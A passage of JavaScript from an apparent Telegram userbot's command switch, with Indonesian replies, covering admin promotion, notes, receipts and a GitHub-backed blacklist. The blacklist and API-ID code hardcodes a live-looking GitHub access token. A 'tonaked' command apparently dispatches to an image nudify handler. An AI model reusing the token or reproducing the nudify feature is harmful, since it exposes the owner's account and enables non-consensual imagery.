          await tryEditAdmin("");
        } else {
          throw err;
        }
      }

      await client.sendMessage(chatId, {
        message: `<blockquote>✅ <a href="tg://user?id=${targetId}">ᴋᴀᴄᴜɴɢ</a> ʙᴇʀʜᴀsɪʟ ᴅɪᴘʀᴏᴍᴏᴛᴇ${rank ? ` sebagai <b>${escapeHtml(rank)}</b>` : ""}.</blockquote>`,
        parseMode: "html",
        replyTo: message.id,
      });

    } catch (err) {
      console.error("Promote error:", err);
      await client.sendMessage(message.chatId || message.chat?.id, {
        message: `<blockquote>❌ ɢᴀɢᴀʟ ᴘʀᴏᴍᴏᴛᴇ ᴋᴀᴄᴜɴɢ: <code>${escapeHtml(String(err?.message || err))}</code></blockquote>`,
        parseMode: "html",
        replyTo: message.id,
      });
    }
  })();
  break;
}

case "demote": {
  (async () => {
    try {
      const chatId = message.chatId || message.chat?.id;
      const args = (message.text || "").split(/\s+/).slice(1);
      const replyMsg = message.replyTo ? await message.getReplyMessage() : null;

      let targetId = null;
      if (replyMsg) {
        targetId = replyMsg.senderId || replyMsg.fromId?.userId || replyMsg.sender?.id;
      } else if (args.length) {
        const lookup = args[0].replace(/^@/, "").trim();
        try {
          const ent = await client.getEntity(lookup);
          targetId = ent?.id || ent?.userId;
        } catch {
          try {
            const parts = await client.getParticipants(chatId);
            const found = parts.find(u => {
              const uname = (u.username || "").toLowerCase();
              const fname = (u.firstName || u.first_name || "").toLowerCase();
              const lname = (u.lastName || u.last_name || "").toLowerCase();
              return (
                uname === lookup.toLowerCase() ||
                fname === lookup.toLowerCase() ||
                `${fname} ${lname}`.trim() === lookup.toLowerCase()
              );
            });
            targetId = found?.id || found?.user?.id;
          } catch {}
        }
      }

      if (!targetId) {
        return client.sendMessage(chatId, {
          message: "<blockquote>❌ ᴛɪᴅᴀᴋ ᴍᴇɴᴇᴍᴜᴋᴀɴ ᴋᴀᴄᴜɴɢ</blockquote>",
          parseMode: "html",
          replyTo: message.id,
        });
      }

      const emptyRights = new Api.ChatAdminRights({
        changeInfo: false,
        postMessages: false,
        editMessages: false,
        deleteMessages: false,
        banUsers: false,
        inviteUsers: false,
        pinMessages: false,
        addAdmins: false,
        anonymous: false,
        manageCalls: false,
      });

      let chatEntity = null;
      try {
        chatEntity = await client.getEntity(chatId);
      } catch (e) {  }

      try {
        await client.invoke(new Api.channels.EditAdmin({
          channel: chatEntity || chatId,
          userId: targetId,
          adminRights: emptyRights,
          rank: ""
        }));
      } catch (err) {
        throw err;
      }

      await client.sendMessage(chatId, {
        message: `<blockquote>✅ <a href="tg://user?id=${targetId}">ᴋᴀᴄᴜɴɢ</a> ʙᴇʀʜᴀsɪʟ ᴅɪʜᴀᴘᴜs ᴅᴀʀɪ ᴀᴅᴍɪɴ</blockquote>`,
        parseMode: "html",
        replyTo: message.id,
      });

    } catch (err) {
      console.error("Demote error:", err);
      await client.sendMessage(message.chatId || message.chat?.id, {
        message: `<blockquote>❌ ɢᴀɢᴀʟ ᴅᴇᴍᴏᴛᴇ ᴋᴀᴄᴜɴɢ: <code>${escapeHtml(String(err && err.message || err))}</code></blockquote>`,
        parseMode: "html",
        replyTo: message.id,
      });
    }
  })();
  break;
}

case "ambilfile":
  await handleAmbilFile(message, client, prefix);
  break;

case "ig":
  await handlerIg(client, message, prefix);
  break;

case 'brat':
  await handlerBrat(message, client, prefix);
  break;
  
case 'toimg':
  await handlerToImg(message, client, prefix);
  break;
  
case "cekapikey":
  await cekapikeyHandler(message, client, prefix);
  break;

case 'tonaked':
  await handlerTonaked(message, client, prefix);
  break;

case "play":
  await handlerPlay(client, message, prefix);
  break;

case 'enchtml':
  await handlerEnchtml(client, message, prefix);
  break;

case 'encinvishtml':
  await encinvishtmlHandler(message, client, prefix);
  break;

case 'invishtml2':
  await invishtmlHandler(message, client, prefix);
  break;

case 'deploy':
    await deployHandler(message, client, prefix);
  break;

case 'tourl2':
    await tourl2Handler(message, client, prefix);
  break;

case 'ttsearch':
    await ttsearchHandler(message, client, prefix);
  break;
  
case "listdeploy":
  await listDeployHandler(message, client, prefix);
  break;

case "deldeploy":
  await deleteDeployHandler(message, client, prefix);
  break;
  
case 'cekvps':
   await cekVPSHandler(message, client, prefix);
   break;
   
case 'done': {
  (async () => {
    try {
      const replyMsg = await message.getReplyMessage?.() || message.replyTo;
      const chatId = message.chatId || message.chat?.id;
      const argsText = args.join(" ");
      const parts = argsText.split(",");

      const nama = parts[0]?.trim();
      const harga = parts[1]?.trim();
      const metode = parts[2]?.trim();
      const tittle = parts[3]?.trim();
      const waktu = waktuJakarta();

      if (!nama || !harga || !metode) {
        return client.sendMessage(chatId, {
          message: `<blockquote>⚠️ <b>ғᴏʀᴍᴀᴛ:</b>\n<code>${prefix}done nama,harga,metode,tittle</code>\n\nᴄᴏɴᴛᴏʜ:\n<code>${prefix}done produk,15000,QRIS,YAKUZA</code></blockquote>`,
          parseMode: "html",
          replyTo: message.id
        });
      }

      const caption = `<blockquote>「 𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗕𝗘𝗥𝗛𝗔𝗦𝗜𝗟 」\n</blockquote>
<blockquote>📦 <b>ʙᴀʀᴀɴɢ : ${nama}</b>
💸 <b>ɴᴏᴍɪɴᴀʟ : ${harga}</b>
🕰️ <b>ᴡᴀᴋᴛᴜ : ${waktu}</b>
💳 <b>ᴘᴀʏᴍᴇɴᴛ : ${metode}</b></blockquote>
<blockquote>ᴛᴇʀɪᴍᴀᴋᴀsɪʜ ᴛᴇʟᴀʜ ᴏʀᴅᴇʀ ᴅɪ <b>${tittle}</b></blockquote>`;

      let filePath = null;

      if (replyMsg && (replyMsg.photo || replyMsg.media?.photo || (replyMsg.document && /image\//i.test(replyMsg.document.mimeType)))) {
        const buffer = await client.downloadMedia(replyMsg.media || replyMsg);
        const fs = require("fs");
        const path = require("path");
        filePath = path.join(process.cwd(), `done_${Date.now()}.jpg`);
        fs.writeFileSync(filePath, buffer);

        await client.sendFile(chatId, {
          file: filePath,
          caption,
          parseMode: "html",
          replyTo: message.id
        });
      } else {
        await client.sendMessage(chatId, {
          message: caption,
          parseMode: "html",
          replyTo: message.id
        });
      }

      const dialogs = await client.getDialogs();
      const channels = dialogs.filter(d => d.isChannel);

      for (const ch of channels) {
        try {
          if (filePath) {
            await client.sendFile(ch.id, {
              file: filePath,
              caption,
              parseMode: "html"
            });
          } else {
            await client.sendMessage(ch.id, {
              message: caption,
              parseMode: "html"
            });
          }
        } catch (e) {
          console.log("Gagal kirim ke channel:", ch.id, e.message);
        }
      }

      if (filePath) {
        const fs = require("fs");
        fs.unlinkSync(filePath);
      }

    } catch (err) {
      console.error("❌ Error .done:", err);
      await client.sendMessage(message.chatId, {
        message: `<blockquote>⚠️ ᴛᴇʀᴊᴀᴅɪ ᴋᴇsᴀʟᴀʜᴀɴ: ${err.message}</blockquote>`,
        parseMode: "html",
        replyTo: message.id
      });
    }
  })();
  break;
}
   
case 'getpp':
  await getppHandler(message, client, prefix);
  break;

case "addnote": {
    const notes = loadNotes();
    const name = args.shift()?.toLowerCase();
    const text = args.join(" ");
    const replyMsg = await message.getReplyMessage?.() || message.replyToMessage;

    if (!name) {
      await client.sendMessage(chatId, {
        message: `<blockquote>⚠️ <b>ғᴏʀᴍᴀᴛ:</b> ${prefix}addnote <nama> [teks atau reply media]</blockquote>`,
        parseMode: "html",
        replyTo: message.id
      });
      break;
    }

    if (replyMsg && (replyMsg.photo || replyMsg.media?.photo || (replyMsg.document && /image\//i.test(replyMsg.document.mimeType)))) {
      try {
        const caption = replyMsg.message || text || "(ᴛᴀɴᴘᴀ ᴄᴀᴘᴛɪᴏɴ)";
        const buffer = await client.downloadMedia(replyMsg.media || replyMsg);
        const filePath = path.join(process.cwd(), `note_${name}_${Date.now()}.jpg`);
        fs.writeFileSync(filePath, buffer);

        notes[name] = {
          type: "photo",
          path: filePath,
          caption,
          user: message.senderId
        };
        saveNotes(notes);

        await client.sendMessage(chatId, {
          message: `<blockquote>✅ ɴᴏᴛᴇ: <b>${name}</b> ʙᴇʀʜᴀsɪʟ ᴅɪsɪᴍᴘᴀɴ!</blockquote>`,
          parseMode: "html",
          replyTo: message.id
        });
      } catch (err) {
        await client.sendMessage(chatId, {
          message: `<blockquote>❌ ɢᴀɢᴀʟ ᴍᴇɴʏɪᴍᴘᴀɴ ғᴏᴛᴏ: ${err.message}</blockquote>`,
          parseMode: "html",
          replyTo: message.id
        });
      }
      break;
    }

    if (!text) {
      await client.sendMessage(chatId, {
        message: `<blockquote>⚠️ ʙᴀʟᴀs ᴘᴇsᴀɴ ᴀᴛᴀᴜ ʙᴇʀɪ ᴛᴇᴋs ᴜɴᴛᴜᴋ ᴅɪsɪᴍᴘᴀɴ!</blockquote>`,
        parseMode: "html",
        replyTo: message.id
      });
      break;
    }

    notes[name] = { type: "text", content: text, user: message.senderId };
    saveNotes(notes);

    await client.sendMessage(chatId, {
      message: `<blockquote>✅ ɴᴏᴛᴇ: <b>${name}</b> ʙᴇʀʜᴀsɪʟ ᴅɪsɪᴍᴘᴀɴ!</blockquote>`,
      parseMode: "html",
      replyTo: message.id
    });
  }
  break;

case "getnote": {
    const notes = loadNotes();
    const name = args[0]?.toLowerCase();

    if (!name) {
      await client.sendMessage(chatId, {
        message: `<blockquote>⚠️ <b>ғᴏʀᴍᴀᴛ:</b> ${prefix}getnote <nama></blockquote>`,
        parseMode: "html",
        replyTo: message.id
      });
      break;
    }

    const note = notes[name];
    if (!note) {
      await client.sendMessage(chatId, {
        message: `<blockquote>❌ ɴᴏᴛᴇ <b>${name}</b> ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ!</blockquote>`,
        parseMode: "html",
        replyTo: message.id
      });
      break;
    }

    if (note.type === "photo") {
      await client.sendFile(chatId, {
        file: note.path,
        caption: `<blockquote>${note.caption}</blockquote>`,
        parseMode: "html",
        replyTo: message.id
      });
    } else {
      await client.sendMessage(chatId, {
        message: `<blockquote>${note.content}</blockquote>`,
        parseMode: "html",
        replyTo: message.id
      });
    }
  }
  break;

case "listnote": {
    const notes = loadNotes();
    const keys = Object.keys(notes);

    if (!keys.length) {
      await client.sendMessage(chatId, {
        message: `<blockquote>📃 ʙᴇʟᴜᴍ ᴀᴅᴀ ɴᴏᴛᴇ ᴛᴇʀsɪᴍᴘᴀɴ</blockquote>`,
        parseMode: "html",
        replyTo: message.id
      });
      break;
    }

    const list = keys.map((n, i) => `\n│ ${i + 1}. ${n}`).join("\n");
    await client.sendMessage(chatId, {
      message: `<blockquote>📋 <b>ᴅᴀғᴛᴀʀ ɴᴏᴛᴇ:</b>\n${list}</blockquote>`,
      parseMode: "html",
      replyTo: message.id
    });
  }
  break;

case "delnote": {
    const notes = loadNotes();
    const name = args[0]?.toLowerCase();

    if (!name) {
      await client.sendMessage(chatId, {
        message: `<blockquote>⚠️ <b>ғᴏʀᴍᴀᴛ:</b> ${prefix}delnote <nama></blockquote>`,
        parseMode: "html",
        replyTo: message.id
      });
      break;
    }

    if (!notes[name]) {
      await client.sendMessage(chatId, {
        message: `<blockquote>❌ ɴᴏᴛᴇ <b>${name}</b> ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ!</blockquote>`,
        parseMode: "html",
        replyTo: message.id
      });
      break;
    }

    if (notes[name].type === "photo" && fs.existsSync(notes[name].path)) {
      fs.unlinkSync(notes[name].path);
    }

    delete notes[name];
    saveNotes(notes);

    await client.sendMessage(chatId, {
      message: `<blockquote>✅️ ɴᴏᴛᴇ: <b>${name}</b> ʙᴇʀʜᴀsɪʟ ᴅɪʜᴀᴘᴜs!</blockquote>`,
      parseMode: "html",
      replyTo: message.id
    });
  }
  break;
  
case 'installprotect1':
  await handlerInstall1(message, client, args, prefix);
  break;

case 'installprotect2':
  await handlerInstall2(message, client, args, prefix);
  break;

case 'installprotect3':
  await handlerInstall3(message, client, args, prefix);
  break;

case 'installprotect4':
  await handlerInstall4(message, client, args, prefix);
  break;

case 'installprotect5':
  await handlerInstall5(message, client, args, prefix);
  break;

case 'installprotect6':
  await handlerInstall6(message, client, args, prefix);
  break;

case 'installprotect7':
  await handlerInstall7(message, client, args, prefix);
  break;

case 'installprotect8':
  await handlerInstall8(message, client, args, prefix);
  break;

case 'installprotect9':
  await handlerInstall9(message, client, args, prefix);
  break;

case 'installprotect10':
  await handlerInstall10(message, client, args, prefix);
  break;
  
case 'installprotect11':
  await handlerInstall11(message, client, args, prefix);
  break;
  
case 'installprotect12':
  await handlerInstall12(message, client, args, prefix);
  break;

case 'installprotectall':
  await handlerInstallAll(message, client, args, prefix);
  break;

case 'uninstallprotect1':
  await handlerUninstall1(message, client, args, prefix);
  break;

case 'uninstallprotect2':
  await handlerUninstall2(message, client, args, prefix);
  break;

case 'uninstallprotect3':
  await handlerUninstall3(message, client, args, prefix);
  break;

case 'uninstallprotect4':
  await handlerUninstall4(message, client, args, prefix);
  break;

case 'uninstallprotect5':
  await handlerUninstall5(message, client, args, prefix);
  break;

case 'uninstallprotect6':
  await handlerUninstall6(message, client, args, prefix);
  break;

case 'uninstallprotect7':
  await handlerUninstall7(message, client, args, prefix);
  break;

case 'uninstallprotect8':
  await handlerUninstall8(message, client, args, prefix);
  break;

case 'uninstallprotect9':
  await handlerUninstall9(message, client, args, prefix);
  break;

case 'uninstallprotectall':
  await handlerUninstallAll(message, client, args, prefix);
  break;

case 'bl': {
  (async () => {
    try {
      const chatId = message.chatId || message.chat?.id;
      const serverId = args[0]?.trim();

      if (!serverId) {
        return client.sendMessage(chatId, {
          message: `<blockquote>⚠️ <b>ғᴏʀᴍᴀᴛ:</b> ${prefix}bl id_server</blockquote>`,
          parseMode: "html",
          replyTo: message.id
        });
      }

      const owner = 'ObyMoods';
      const repo = 'ObyDatabase';
      const filePath = 'blacklist.json';
      const token = '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';

      const loadingMsg = await client.sendMessage(chatId, {
        message: `<blockquote>🚀 ᴍᴇɴᴀᴍʙᴀʜᴋᴀɴ ɪᴅ sᴇʀᴠᴇʀ ᴋᴇ ʙʟᴀᴄᴋʟɪsᴛ...</blockquote>`,
        parseMode: "html",
        replyTo: message.id
      });

      try {
        const axios = require('axios');
        
        const getFileUrl = `https://api.github.com/repos/${owner}/${repo}/contents/${filePath}`;
        const getResponse = await axios.get(getFileUrl, {
          headers: {
            'Authorization': `token ${token}`,
            'Accept': 'application/vnd.github.v3+json'
          }
        });

        const currentContent = Buffer.from(getResponse.data.content, 'base64').toString('utf8');
        let blacklistArray = JSON.parse(currentContent);

        if (blacklistArray.includes(serverId)) {
          await client.deleteMessages(chatId, [loadingMsg.id], { revoke: true });
          return client.sendMessage(chatId, {
            message: `<blockquote>⚠️ ɪᴅ sᴇʀᴠᴇʀ <code>${serverId}</code> sᴜᴅᴀʜ ᴀᴅᴀ ᴅɪ ʙʟᴀᴄᴋʟɪsᴛ!</blockquote>`,
            parseMode: "html",
            replyTo: message.id
          });
        }

        blacklistArray.push(serverId);
        
        const updateContent = JSON.stringify(blacklistArray, null, 2);
        const updateResponse = await axios.put(getFileUrl, {
          message: `Add server ${serverId} to blacklist`,
          content: Buffer.from(updateContent).toString('base64'),
          sha: getResponse.data.sha,
          committer: {
            name: 'Yakuza Bot',
            email: 'bot@yakuza.com'
          }
        }, {
          headers: {
            'Authorization': `token ${token}`,
            'Accept': 'application/vnd.github.v3+json'
          }
        });

        await client.deleteMessages(chatId, [loadingMsg.id], { revoke: true });

        await client.sendMessage(chatId, {
          message: `<blockquote>✅ <b>ʙᴇʀʜᴀsɪʟ ᴅɪ ᴍᴀsᴜᴋᴋᴀɴ ʙʟᴀᴄᴋʟɪsᴛ</b>\n\n🆔 <b>ɪᴅ sᴇʀᴠᴇʀ:</b> <code>${serverId}</code>\n📋 <b>ᴛᴏᴛᴀʟ:</b> ${blacklistArray.length} sᴇʀᴠᴇʀ\n\n© ʙʏ ʏᴀᴋᴜᴢᴀ</blockquote>`,
          parseMode: "html",
          replyTo: message.id
        });

      } catch (error) {
        await client.deleteMessages(chatId, [loadingMsg.id], { revoke: true });
        
        if (error.response?.status === 404) {
          await createNewBlacklist(owner, repo, filePath, token, serverId, chatId);
        } else {
          await client.sendMessage(chatId, {
            message: `<blockquote>⚠️ ᴇʀʀᴏʀ: ${error.response?.data?.message || error.message}</blockquote>`,
            parseMode: "html",
            replyTo: message.id
          });
        }
      }

    } catch (err) {
      console.error("❌ Error .bl:", err);
      await client.sendMessage(chatId, {
        message: `<blockquote>⚠️ ᴇʀʀᴏʀ: ${err.message}</blockquote>`,
        parseMode: "html",
        replyTo: message.id
      });
    }
  })();
  break;
}

async function createNewBlacklist(owner, repo, filePath, token, serverId, chatId) {
  try {
    const axios = require('axios');
    const createUrl = `https://api.github.com/repos/${owner}/${repo}/contents/${filePath}`;
    
    const newBlacklist = [serverId];
    const content = JSON.stringify(newBlacklist, null, 2);
    
    await axios.put(createUrl, {
      message: `Create blacklist and add server ${serverId}`,
      content: Buffer.from(content).toString('base64'),
      committer: {
        name: 'Yakuza Bot',
        email: 'bot@yakuza.com'
      }
    }, {
      headers: {
        'Authorization': `token ${token}`,
        'Accept': 'application/vnd.github.v3+json'
      }
    });

    await client.sendMessage(chatId, {
      message: `<blockquote>✅ <b>ᴍᴇᴍʙᴜᴀᴛ ʙʟᴀᴄᴋʟɪsᴛ</b>\n\n🆔 <b> ɪᴅ sᴇʀᴠᴇʀ:</b> <code>${serverId}</code>\n📋 <b>ᴛᴏᴛᴀʟ:</b> 1 sᴇʀᴠᴇʀ\n\n© ʙʏ ʏᴀᴋᴜᴢᴀ</blockquote>`,
      parseMode: "html",
      replyTo: message.id
    });

  } catch (error) {
    await client.sendMessage(chatId, {
      message: `<blockquote>❌ ғᴀɪʟᴇᴅ ᴛᴏ ᴄʀᴇᴀᴛᴇ ʙʟᴀᴄᴋʟɪsᴛ: ${error.message}</blockquote>`,
      parseMode: "html",
      replyTo: message.id
    });
  }
}

case 'delbl': {
  (async () => {
    try {
      const chatId = message.chatId || message.chat?.id;
      const number = args[0]?.trim();

      if (!number || isNaN(number)) {
        return client.sendMessage(chatId, {
          message: `<blockquote>⚠️ <b>ғᴏʀᴍᴀᴛ:</b> ${prefix}delbl no</blockquote>`,
          parseMode: "html",
          replyTo: message.id
        });
      }

      const indexToDelete = parseInt(number) - 1;

      const owner = 'ObyMoods';
      const repo = 'ObyDatabase';
      const filePath = 'blacklist.json';
      const token = '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';

      const loadingMsg = await client.sendMessage(chatId, {
        message: `<blockquote>🚀 ᴍᴇɴɢʜᴀᴘᴜs sᴇʀᴠᴇʀ ᴅᴀʀɪ ʙʟᴀᴄᴋʟɪsᴛ...</blockquote>`,
        parseMode: "html",
        replyTo: message.id
      });

      try {
        const axios = require('axios');
        
        const getFileUrl = `https://api.github.com/repos/${owner}/${repo}/contents/${filePath}`;
        const getResponse = await axios.get(getFileUrl, {
          headers: {
            'Authorization': `token ${token}`,
            'Accept': 'application/vnd.github.v3+json'
          }
        });

        const currentContent = Buffer.from(getResponse.data.content, 'base64').toString('utf8');
        let blacklistArray = JSON.parse(currentContent);

        if (indexToDelete < 0 || indexToDelete >= blacklistArray.length) {
          await client.deleteMessages(chatId, [loadingMsg.id], { revoke: true });
          return client.sendMessage(chatId, {
            message: `<blockquote>❌ ɴᴏ <code>${number}</code> ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ!</blockquote>`,
            parseMode: "html",
            replyTo: message.id
          });
        }

        const deletedId = blacklistArray[indexToDelete];

        blacklistArray.splice(indexToDelete, 1);
        
        const updateContent = JSON.stringify(blacklistArray, null, 2);
        const updateResponse = await axios.put(getFileUrl, {
          message: `ʀᴇᴍᴏᴠᴇ sᴇʀᴠᴇʀ ${deletedId} ғʀᴏᴍ ʙʟᴀᴄᴋʟɪsᴛ`,
          content: Buffer.from(updateContent).toString('base64'),
          sha: getResponse.data.sha,
          committer: {
            name: 'Yakuza Bot',
            email: 'bot@yakuza.com'
          }
        }, {
          headers: {
            'Authorization': `token ${token}`,
            'Accept': 'application/vnd.github.v3+json'
          }
        });

        await client.deleteMessages(chatId, [loadingMsg.id], { revoke: true });

        await client.sendMessage(chatId, {
          message: `<blockquote>✅ <b>ʙᴇʀʜᴀsɪʟ ʜᴀᴘᴜs sᴇʀᴠᴇʀ</b>\n\n🚀 <b>ᴅᴇʟᴇᴛᴇᴅ:</b> <code>${deletedId}</code>\n📋 <b>ᴛᴏᴛᴀʟ:</b> ${blacklistArray.length} sᴇʀᴠᴇʀ\n\n© ʙʏ ʏᴀᴋᴜᴢᴀ</blockquote>`,
          parseMode: "html",
          replyTo: message.id
        });

      } catch (error) {
        await client.deleteMessages(chatId, [loadingMsg.id], { revoke: true });
        
        if (error.response?.status === 404) {
          await client.sendMessage(chatId, {
            message: `<blockquote>📋 ғɪʟᴇ ʙʟᴀᴄᴋʟɪsᴛ ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ</blockquote>`,
            parseMode: "html",
            replyTo: message.id
          });
        } else {
          await client.sendMessage(chatId, {
            message: `<blockquote>⚠️ ᴇʀʀᴏʀ: ${error.response?.data?.message || error.message}</blockquote>`,
            parseMode: "html",
            replyTo: message.id
          });
        }
      }

    } catch (err) {
      console.error("❌ Error .delbl:", err);
      await client.sendMessage(chatId, {
        message: `<blockquote>⚠️ ᴇʀʀᴏʀ: ${err.message}</blockquote>`,
        parseMode: "html",
        replyTo: message.id
      });
    }
  })();
  break;
}

case "add": {
  (async () => {
    try {
      const chatId = message.chatId || message.chat.id;
      const args = message.text.split(" ").slice(1);

      if (args.length < 1) {
        return client.sendMessage(chatId, {
          message: `<blockquote>⚠️ <b>ғᴏʀᴍᴀᴛ:</b> ${prefix}add [api_id]</blockquote>`,
          parseMode: "html",
          replyTo: message.id
        });
      }

      const apiId = args[0].trim();
      
      if (!/^\d+$/.test(apiId)) {
        return client.sendMessage(chatId, {
          message: "<blockquote>❌ <b>API_ID ʜᴀʀᴜs ʙᴇʀᴜᴘᴀ ᴀɴɢᴋᴀ!</b></blockquote>",
          parseMode: "html",
          replyTo: message.id
        });
      }

      const loadingMsg = await client.sendMessage(chatId, {
        message: `<blockquote>🚀 <b>ᴍᴇɴᴀᴍʙᴀʜᴋᴀɴ API_ID ${apiId} ᴋᴇ ᴅᴀғᴛᴀʀ...</b></blockquote>`,
        parseMode: "html",
        replyTo: message.id
      });

      const result = await addApiIdToGithub(apiId);

      await client.deleteMessages(chatId, [loadingMsg.id], { revoke: true });
      
      if (result.updated) {
        await client.sendMessage(chatId, {
          message: `<blockquote>✅ <b>API_ID ʙᴇʀʜᴀsɪʟ ᴅɪᴛᴀᴍʙᴀʜᴋᴀɴ!</b>\n\n✏️ <b>API_ID:</b> <code>${apiId}</code>\n📋 <b>ᴛᴏᴛᴀʟ ɪᴅ ᴛᴇʀᴅᴀғᴛᴀʀ:</b> ${result.totalIds}\n\n🕒 <b>ᴡᴀᴋᴛᴜ:</b> ${new Date().toLocaleString('id-ID')}</blockquote>`,
          parseMode: "html",
          replyTo: message.id
        });
      } else {
        await client.sendMessage(chatId, {
          message: `<blockquote>⚠️ <b>API_ID sᴜᴅᴀʜ ᴛᴇʀᴅᴀғᴛᴀʀ!</b>\n\n✏️ <b>API_ID:</b> <code>${apiId}</code>\n📋 <b>ᴛᴏᴛᴀʟ ɪᴅ ᴛᴇʀᴅᴀғᴛᴀʀ:</b> ${result.totalIds}</blockquote>`,
          parseMode: "html",
          replyTo: message.id
        });
      }

    } catch (error) {
      console.error("Error in add command:", error);
      const chatId = message.chatId || message.chat.id;
      
      try {
        await client.deleteMessages(chatId, [loadingMsg.id], { revoke: true });
      } catch (e) {}
      
      await client.sendMessage(chatId, {
        message: `<blockquote>❌ <b>ɢᴀɢᴀʟ ᴍᴇɴᴀᴍʙᴀʜᴋᴀɴ API_ID!</b>\n\n⚠️ <b>ᴇʀʀᴏʀ:</b> <code>${error.message}</code></blockquote>`,
        parseMode: "html",
        replyTo: message.id
      });
    }
  })();
  break;
}

async function addApiIdToGithub(apiId) {
  const owner = 'ObyMoods';
  const repo = 'ObyDatabase';
  const filePath = 'api_ids.json';
  const token = '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';
  
  try {
    
    let currentData = { allowed_api_ids: [] };
    
    try {
      const url = `https://api.github.com/repos/${owner}/${repo}/contents/${filePath}`;
      const res = await axios.get(url, {
        headers: {
          Authorization: `token ${token}`,
          Accept: "application/vnd.github.v3+json",
          'User-Agent': 'UBOT-YAKUZA-BOT'
        },
        timeout: 10000
      });
      
      const content = Buffer.from(res.data.content, 'base64').toString('utf8');
      const jsonData = JSON.parse(content);
      
      if (jsonData && jsonData.allowed_api_ids && Array.isArray(jsonData.allowed_api_ids)) {
        currentData.allowed_api_ids = jsonData.allowed_api_ids.map(id => String(id).trim());
      }
    } catch (e) {
      if (e.response?.status === 404) {
        console.log("⚠️ File api_ids.json tidak ditemukan");
      } else {
        console.log("⚠️ Gagal ambil daftar API ID");
      }
      currentData.allowed_api_ids = [];
    }

    if (currentData.allowed_api_ids.includes(String(apiId))) {
      return { 
        updated: false, 
        message: "already_exists",
        totalIds: currentData.allowed_api_ids.length
      };
    }

    currentData.allowed_api_ids.push(String(apiId));
    
    const url = `https://api.github.com/repos/${owner}/${repo}/contents/${filePath}`;
    
    let sha = null;
    try {
      const fileData = await axios.get(url, {
        headers: {
          Authorization: `token ${token}`,
          Accept: "application/vnd.github.v3+json",
          'User-Agent': 'UBOT-YAKUZA-BOT'
        },
        timeout: 10000
      });
      sha = fileData.data.sha;
    } catch (error) {
      if (error.response?.status !== 404) {
        console.log("⚠️ Gagal mengambil data file");
      }
    }

    const payload = {
      message: `➕ Add API ID ${apiId} - UBOT YAKUZA`,
      content: Buffer.from(JSON.stringify(currentData, null, 2), "utf8").toString("base64"),
      branch: "main",
    };
    
    if (sha) payload.sha = sha;

    const headers = {
      Authorization: `token ${token}`,
      Accept: "application/vnd.github.v3+json",
      'User-Agent': 'UBOT-YAKUZA-BOT'
    };
    
    const res = await axios.put(url, payload, { headers, timeout: 15000 });
        
    return { 
      updated: true, 
      result: res.data,
      totalIds: currentData.allowed_api_ids.length
    };
    
  } catch (error) {
    console.error("❌ Error menambah API ID:", error.response?.data || error.message);
    throw error;
  }
}

case "listapi": {
  (async () => {
    try {
      const chatId = message.chatId || message.chat.id;

      const loadingMsg = await client.sendMessage(chatId, {
        message: `<blockquote>🚀 <b>ᴍᴇɴɢᴀᴍʙɪʟ ᴅᴀғᴛᴀʀ API_ID...</b></blockquote>`,
        parseMode: "html",
        replyTo: message.id
      });

      const apiIds = await getAllApiIds();
      
      await client.deleteMessages(chatId, [loadingMsg.id], { revoke: true });
      
      if (apiIds.length === 0) {
        await client.sendMessage(chatId, {
          message: `<blockquote>📋 <b>ʟɪsᴛ ᴅᴀғᴛᴀʀ API_ID</b>\n\n❌ <b>ᴛɪᴅᴀᴋ ᴀᴅᴀ API_ID ʏᴀɴɢ ᴛᴇʀᴅᴀғᴛᴀʀ</b></blockquote>`,
          parseMode: "html",
          replyTo: message.id
        });
      } else {
        const apiList = apiIds.map((id, index) => `${index + 1}. <code>${id}</code>`).join('\n');
        
        await client.sendMessage(chatId, {
          message: `<blockquote>📋 <b>ʟɪsᴛ ᴅᴀғᴛᴀʀ API_ID</b>\n\n${apiList}\n\n✏️ <b>ᴛᴏᴛᴀʟ:</b> ${apiIds.length} API_ID</blockquote>`,
          parseMode: "html",
          replyTo: message.id
        });
      }

    } catch (error) {
      console.error("Error in listapi command:", error);
      const chatId = message.chatId || message.chat.id;
      
      try {
        await client.deleteMessages(chatId, [loadingMsg.id], { revoke: true });
      } catch (e) {}
      
      await client.sendMessage(chatId, {
        message: `<blockquote>❌ <b>ɢᴀɢᴀʟ ᴍᴇɴɢᴀᴍʙɪʟ ᴅᴀғᴛᴀʀ API_ID!</b>\n\n⚠️ <b>ᴇʀʀᴏʀ:</b> <code>${error.message}</code></blockquote>`,
        parseMode: "html",
        replyTo: message.id
      });
    }
  })();
  break;
}

case "delapi": {
  (async () => {
    try {
      const chatId = message.chatId || message.chat.id;
      const args = message.text.split(" ").slice(1);

      if (args.length < 1) {
        return client.sendMessage(chatId, {
          message: `<blockquote>⚠️ <b>ғᴏʀᴍᴀᴛ:</b> ${prefix}delapi [no]</blockquote>`,
          parseMode: "html",
          replyTo: message.id
        });
      }

      const number = args[0].trim();
      
      if (!/^\d+$/.test(number)) {
        return client.sendMessage(chatId, {
          message: "<blockquote>❌ <b>ɴᴏ ᴜʀᴜᴛᴀɴ ʜᴀʀᴜs ʙᴇʀᴜᴘᴀ ᴀɴɢᴋᴀ!</b></blockquote>",
          parseMode: "html",
          replyTo: message.id
        });
      }

      const loadingMsg = await client.sendMessage(chatId, {
        message: `<blockquote>🚀 <b>ᴍᴇɴɢᴀᴍʙɪʟ ᴅᴀғᴛᴀʀ API_ID...</b></blockquote>`,
        parseMode: "html",
        replyTo: message.id
      });

      const apiIds = await getAllApiIds();
      
      await client.deleteMessages(chatId, [loadingMsg.id], { revoke: true });
      
      if (apiIds.length === 0) {
        return client.sendMessage(chatId, {
          message: `<blockquote>❌ <b>ᴛɪᴅᴀᴋ ᴀᴅᴀ API_ID ʏᴀɴɢ ᴛᴇʀᴅᴀғᴛᴀʀ!</b></blockquote>`,
          parseMode: "html",
          replyTo: message.id
        });
      }

      const index = parseInt(number) - 1;
      
      if (index < 0 || index >= apiIds.length) {
        const apiList = apiIds.map((id, idx) => `${idx + 1}. <code>${id}</code>`).join('\n');
        
        return client.sendMessage(chatId, {
